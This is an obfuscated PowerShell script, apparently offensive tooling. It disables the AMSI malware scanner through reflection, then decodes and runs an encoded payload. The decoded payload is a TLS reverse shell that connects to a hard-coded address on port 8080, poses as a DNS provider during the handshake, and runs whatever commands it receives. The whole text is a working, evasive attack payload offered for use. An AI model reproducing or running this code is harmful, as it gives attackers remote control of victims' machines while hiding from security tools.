$VuitbEho2Qbt5NgSQpcj=$null;$C3BUf=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076*968/968));$oc="+[cHaR]([bYTE]0x6b)+[ChAr](118)+[chaR](117*106/106)+[cHaR](121*58/58)+[CHAr]([BYTe]0x75)+[cHAr]([byTE]0x6a)+[ChAR](95+14)+[cHaR](49+60)+[CHAr](116*51/51)+[Char](102*62/62)+[CHar]([Byte]0x73)+[chaR](30+90)+[char]([BYTe]0x72)";[Threading.Thread]::Sleep(647);[Ref].Assembly.GetType("System.$([cHAr](72+5)+[CHAr](95+2)+[cHaR](110)+[ChaR](97)+[Char](103+98-98)+[cHAr](101)+[ChAr](109)+[Char]([bYTE]0x65)+[CHAr](110)+[cHAR](116*79/79)).$([cHAR](55+10)+[chAr]([byte]0x75)+[cHaR](116)+[char]([bYte]0x6f)+[cHAR]([byTE]0x6d)+[ChAR](97+2-2)+[char](116)+[CHaR]([bytE]0x69)+[cHAR]([ByTE]0x6f)+[chAR](110)).$(('Â'+'m'+'s'+'î'+'Ù'+'t'+'ì'+'l'+'s').NORMaLizE([cHAR](70*49/49)+[CHar]([bYte]0x6f)+[char](83+31)+[Char](109*87/87)+[cHar](68*34/34)) -replace [cHaR]([ByTE]0x5c)+[char](112+55-55)+[Char](111+12)+[chAR]([BytE]0x4d)+[CHAR]([byte]0x6e)+[chAr](125*65/65))").GetField("$([ChaR](86+11)+[chaR]([bYtE]0x6d)+[cHAr]([BYTe]0x73)+[chaR]([Byte]0x69)+[cHar](83+20-20)+[ChAR](101)+[chAR]([ByTe]0x73)+[cHaR]([bYtE]0x73)+[CHar](105*75/75)+[CHAr](111+31-31)+[CHAR](110+36-36))", "NonPublic,Static").SetValue($VuitbEho2Qbt5NgSQpcj, $VuitbEho2Qbt5NgSQpcj);[Ref].Assembly.GetType("System.$([cHAr](72+5)+[CHAr](95+2)+[cHaR](110)+[ChaR](97)+[Char](103+98-98)+[cHAr](101)+[ChAr](109)+[Char]([bYTE]0x65)+[CHAr](110)+[cHAR](116*79/79)).$([cHAR](55+10)+[chAr]([byte]0x75)+[cHaR](116)+[char]([bYte]0x6f)+[cHAR]([byTE]0x6d)+[ChAR](97+2-2)+[char](116)+[CHaR]([bytE]0x69)+[cHAR]([ByTE]0x6f)+[chAR](110)).$(('Â'+'m'+'s'+'î'+'Ù'+'t'+'ì'+'l'+'s').NORMaLizE([cHAR](70*49/49)+[CHar]([bYte]0x6f)+[char](83+31)+[Char](109*87/87)+[cHar](68*34/34)) -replace [cHaR]([ByTE]0x5c)+[char](112+55-55)+[Char](111+12)+[chAR]([BytE]0x4d)+[CHAR]([byte]0x6e)+[chAr](125*65/65))").GetField("$([CHAR]([BytE]0x61)+[CHaR](109)+[chAr](32+83)+[CHAR]([bYTE]0x69)+[chaR](58+9)+[ChaR](111*4/4)+[Char]([ByTe]0x6e)+[ChAr]([byTE]0x74)+[CHAr]([byte]0x65)+[ChAR]([BYte]0x78)+[chaR]([BytE]0x74))", "NonPublic,Static").SetValue($VuitbEho2Qbt5NgSQpcj, [IntPtr]$C3BUf);$ptmdroovmxbyopgdroydtbedvjst="+[CHar]([bYtE]0x79)+[chAR]([byTe]0x6b)+[CHAR](105*54/54)+[cHaR]([BYTE]0x71)+[CHAr]([bytE]0x64)+[cHAr](115+73-73)+[cHAR](9+113)+[cHAR]([bYTE]0x7a)";[Threading.Thread]::Sleep(1223)

function R1 { Get-Random -Minimum 1 -Maximum 101 }
function R2 {
    param([byte[]]$x, [byte[]]$y)
    $z = New-Object byte[] $x.Length
    for ($i = 0; $i -lt $x.Length; $i++) {
        $z[$i] = $x[$i] -bxor $y[$i % $y.Length]
    }
    return $z
}
$zutat = "JFA2WVJLOEV0MDlRSUs9JG51bGw7JGtqZj1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoKDkwNzYrODYzMS04NjMxKSk7JGFtcnp3cWxxb2V1YmtucG1td3pwZD0iK1tDaGFSXSgxMTkqMTAwLzEwMCkrW2NIQXJdKFtCeVRFXTB4NjgpK1tjSEFSXShbQnlURV0weDYzKStbQ2hhUl0oW0JZdEVdMHg3MCkrW0NoYXJdKFtCWXRFXTB4NzEpK1tjaGFyXSgxMTcpK1tDaGFyXShbYll0RV0weDc1KSI7W1RocmVhZGluZy5UaHJlYWRdOjpTbGVlcCgyNTYpO1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoIlN5c3RlbS4kKFtDaGFSXSg3NysyLTIpK1tjaEFyXSg5NykrW2NIYXJdKDExMCkrW2NIQVJdKFtCeXRlXTB4NjEpK1tjSGFSXSgxMDMpK1tDSEFyXSgxMDErNzgtNzgpK1tDSEFSXSgxMDkqNzkvNzkpK1tDaGFyXSgxMDEqOC84KStbQ2hhcl0oW2JZVGVdMHg2ZSkrW2NoYVJdKDExNikpLiQoW2NoQXJdKFtCWVRFXTB4NDEpK1tjaEFyXSgyMCs5NykrW2NIYXJdKDExNioxOS8xOSkrW2NIQVJdKFtiWVRFXTB4NmYpK1tDSGFSXShbYll0ZV0weDZkKStbQ0hBcl0oOTcqNjMvNjMpK1tDaGFyXSgxMTYqNTIvNTIpK1tDaEFyXSgxMDUpK1tDaEFSXSgxMTErMjEtMjEpK1tjaGFSXShbYnlURV0weDZlKSkuJCgoJ8OEbXMnKyfDrsOZdCcrJ8OubHMnKS5uT1JtQWxpWmUoW0NoQVJdKFtieXRlXTB4NDYpK1tjSEFyXShbQllURV0weDZmKStbQ2hBcl0oMTE0KjIyLzIyKStbY0hhcl0oMTA5KStbY2hhUl0oW0JZdEVdMHg0NCkpIC1yZXBsYWNlIFtDaGFSXSg5Mis2My02MykrW0NIQVJdKDEwNSs3KStbY2hhUl0oMTIzKzI3LTI3KStbY0hhcl0oNzcrNTYtNTYpK1tjSGFyXShbYnlUZV0weDZlKStbY0hhUl0oW2JZdGVdMHg3ZCkpIikuR2V0RmllbGQoIiQoKCfDoG1zw65Tw6lzJysnc8Osw7RuJykubk9ybUFsSVplKFtjaGFSXShbQllUZV0weDQ2KStbQ2hBUl0oMTExKzYtNikrW2NIQXJdKDg3KzI3KStbY2hhUl0oW2J5VEVdMHg2ZCkrW2NIQXJdKDI3KzQxKSkgLXJlcGxhY2UgW0NIQXJdKDI0KzY4KStbQ0hBUl0oW0J5VEVdMHg3MCkrW0NoQXJdKFtieXRlXTB4N2IpK1tDaEFSXSg3Nys1MS01MSkrW2NIYVJdKDExMCs0MC00MCkrW0NIYXJdKDEyNSsxMTktMTE5KSkiLCAiTm9uUHVibGljLFN0YXRpYyIpLlNldFZhbHVlKCRQNllSSzhFdDA5UUlLLCAkUDZZUks4RXQwOVFJSyk7W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgiU3lzdGVtLiQoW0NoYVJdKDc3KzItMikrW2NoQXJdKDk3KStbY0hhcl0oMTEwKStbY0hBUl0oW0J5dGVdMHg2MSkrW2NIYVJdKDEwMykrW0NIQXJdKDEwMSs3OC03OCkrW0NIQVJdKDEwOSo3OS83OSkrW0NoYXJdKDEwMSo4LzgpK1tDaGFyXShbYllUZV0weDZlKStbY2hhUl0oMTE2KSkuJChbY2hBcl0oW0JZVEVdMHg0MSkrW2NoQXJdKDIwKzk3KStbY0hhcl0oMTE2KjE5LzE5KStbY0hBUl0oW2JZVEVdMHg2ZikrW0NIYVJdKFtiWXRlXTB4NmQpK1tDSEFyXSg5Nyo2My82MykrW0NoYXJdKDExNio1Mi81MikrW0NoQXJdKDEwNSkrW0NoQVJdKDExMSsyMS0yMSkrW2NoYVJdKFtieVRFXTB4NmUpKS4kKCgnw4RtcycrJ8Ouw5l0Jysnw65scycpLm5PUm1BbGlaZShbQ2hBUl0oW2J5dGVdMHg0NikrW2NIQXJdKFtCWVRFXTB4NmYpK1tDaEFyXSgxMTQqMjIvMjIpK1tjSGFyXSgxMDkpK1tjaGFSXShbQll0RV0weDQ0KSkgLXJlcGxhY2UgW0NoYVJdKDkyKzYzLTYzKStbQ0hBUl0oMTA1KzcpK1tjaGFSXSgxMjMrMjctMjcpK1tjSGFyXSg3Nys1Ni01NikrW2NIYXJdKFtieVRlXTB4NmUpK1tjSGFSXShbYll0ZV0weDdkKSkiKS5HZXRGaWVsZCgiJChbY2hBUl0oOTcrNjItNjIpK1tjSEFyXSgxMDkrODMtODMpK1tDaGFSXShbYll0ZV0weDczKStbY0hhcl0oMTA1KjcwLzcwKStbY0hBUl0oW2J5VEVdMHg0MykrW2NIQXJdKDExMSkrW2NIYVJdKDExMCszMi0zMikrW0NoQXJdKDExNikrW0NIQXJdKFtieVRFXTB4NjUpK1tDaGFyXShbQllURV0weDc4KStbQ0hhUl0oMTE2KzkxLTkxKSkiLCAiTm9uUHVibGljLFN0YXRpYyIpLlNldFZhbHVlKCRQNllSSzhFdDA5UUlLLCBbSW50UHRyXSRramYpOyRpeWp4dHpwbHhobXdyanZhcT0iKygnd2p6enDDtGLDo3LDrMOkdicrJ3TDpCcpLm5PUm1BbEl6ZShbY0hhcl0oW0JZdEVdMHg0NikrW0NoYXJdKFtieVRFXTB4NmYpK1tjaEFSXSgxMTQrOTAtOTApK1tjaEFSXShbQllURV0weDZkKStbQ2hBcl0oNjgrNDEtNDEpKSAtcmVwbGFjZSBbQ2hBUl0oW0JZVEVdMHg1YykrW0NIYXJdKFtiWXRFXTB4NzApK1tjaGFSXShbYnlUZV0weDdiKStbQ0hBcl0oW0JZdEVdMHg0ZCkrW2NIYXJdKFtCeXRlXTB4NmUpK1tjSGFyXSgxMjUrNDMtNDMpIjtbVGhyZWFkaW5nLlRocmVhZF06OlNsZWVwKDMyKQ0KZnVuY3Rpb24gRGVjb2RlLUJhc2U2NFN0cmluZygkYil7W1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGIpKX0NCiRXamZJd0o0MjA0MjA2OTY5PURlY29kZS1CYXNlNjRTdHJpbmcgIk1Ua3lMakUyT0M0eE56Z3VNak09Ig0KJFd1cnN0U2FuZHdpY2g0MjA9W2ludF0oRGVjb2RlLUJhc2U2NFN0cmluZyAiT0RBNE1BPT0iKQ0KJHNzbFByb3RvPVtTeXN0ZW0uU2VjdXJpdHkuQXV0aGVudGljYXRpb24uU3NsUHJvdG9jb2xzXTo6VGxzMTINCg0KZnVuY3Rpb24gV3JpdGUtU3RyZWFtKCRzdywkdHh0KXskc3cuV3JpdGUoJHR4dCArICdTSEVMTD4gJyk7JHN3LkZsdXNoKCl9DQoNCndoaWxlKCR0cnVlKXsNCiAgICB0cnl7DQogICAgICAgICRjbGk9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQNCiAgICAgICAgJGNsaS5Db25uZWN0KCRXamZJd0o0MjA0MjA2OTY5LCRXdXJzdFNhbmR3aWNoNDIwKQ0KICAgICAgICAkbmV0U3RyZWFtPSRjbGkuR2V0U3RyZWFtKCkNCiAgICAgICAgJHNzbD1OZXctT2JqZWN0IE5ldC5TZWN1cml0eS5Tc2xTdHJlYW0oJG5ldFN0cmVhbSwkZmFsc2UsKHskdHJ1ZX0gLWFzIFtOZXQuU2VjdXJpdHkuUmVtb3RlQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2tdKSkNCiAgICAgICAgJHNzbC5BdXRoZW50aWNhdGVBc0NsaWVudCgnY2xvdWRmbGFyZS1kbnMuY29tJywkbnVsbCwkc3NsUHJvdG8sJGZhbHNlKQ0KICAgICAgICBpZigtbm90ICgkc3NsLklzRW5jcnlwdGVkIC1hbmQgJHNzbC5Jc1NpZ25lZCkpeyAkc3NsLkNsb3NlKCk7JGNsaS5DbG9zZSgpO1N0YXJ0LVNsZWVwIDU7Y29udGludWUgfQ0KDQogICAgICAgICRzdz1OZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkc3NsKQ0KICAgICAgICAkc3cuQXV0b0ZsdXNoPSR0cnVlDQogICAgICAgIFdyaXRlLVN0cmVhbSAkc3cgJycNCg0KICAgICAgICAkYnVmPU5ldy1PYmplY3QgQnl0ZVtdIDQwOTYNCiAgICAgICAgd2hpbGUoJHRydWUpew0KICAgICAgICAgICAgdHJ5ew0KICAgICAgICAgICAgICAgICRyPSRzc2wuUmVhZCgkYnVmLDAsJGJ1Zi5MZW5ndGgpDQogICAgICAgICAgICAgICAgaWYoJHIgLWxlIDApe3Rocm93ICJ4In0NCiAgICAgICAgICAgICAgICAkY21kPShbVGV4dC5FbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkYnVmLDAsJHIpLlRyaW0oKQ0KICAgICAgICAgICAgICAgIGlmKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRjbWQpKXtXcml0ZS1TdHJlYW0gJHN3ICcnO2NvbnRpbnVlfQ0KDQogICAgICAgICAgICAgICAgIyBTY2h1dHogdm9yIGRpcmVrdGVtIElFWCBtaXQgd2hpdGVsaXN0IChrZWluIGF1dG9tYXRpc2NoZXMgQXVzZsO8aHJlbikNCiAgICAgICAgICAgICAgICBpZigkY21kIC1tYXRjaCAnXlxzKmlleFxzKycpew0KICAgICAgICAgICAgICAgICAgICAkb3V0PSJJbnZva2UtRXhwcmVzc2lvbiBpc3QgZGVha3RpdmllcnQuIg0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIHRyeXskb3V0PUludm9rZS1FeHByZXNzaW9uICRjbWQgMj4mMSB8IE91dC1TdHJpbmd9Y2F0Y2h7JG91dD0kXy5FeGNlcHRpb24uTWVzc2FnZX0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgV3JpdGUtU3RyZWFtICRzdyAkb3V0DQogICAgICAgICAgICB9Y2F0Y2h7YnJlYWt9DQogICAgICAgIH0NCg0KICAgICAgICAkc3cuQ2xvc2UoKQ0KICAgICAgICAkc3NsLkNsb3NlKCkNCiAgICAgICAgJG5ldFN0cmVhbS5DbG9zZSgpDQogICAgICAgICRjbGkuQ2xvc2UoKQ0KICAgIH1jYXRjaHt9DQogICAgU3RhcnQtU2xlZXAgNQ0KfQ==" 

$s1 = $zutat.Substring(0, 4)
$s2 = $zutat.Substring(4, 5)
$s3 = $zutat.Substring(9, 4)
$s4 = $zutat.Substring(13, 6)
$s5 = $zutat.Substring(19, 3)
$s6 = $zutat.Substring(22, 5)
$s7 = $zutat.Substring(27)

$gekocht = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7

$b = [Text.Encoding]::UTF8.GetBytes($gekocht)
$c = [string][math]::Round([math]::Pow((R1),10))
$d = [Text.Encoding]::UTF8.GetBytes($c)
$e = $d[($d.Length-1)..0]

$f1 = R2 -x $b -y $d
$f2 = R2 -x $f1 -y $e
$g = [Text.Encoding]::UTF8.GetString($f2)

$h = R2 -x ([Text.Encoding]::UTF8.GetBytes($g)) -y $e
$i = R2 -x $h -y $d
$j = [Text.Encoding]::UTF8.GetString($i)
$k = [Convert]::FromBase64String($j)
$l = [Text.Encoding]::UTF8.GetString($k)

Invoke-Expression $l
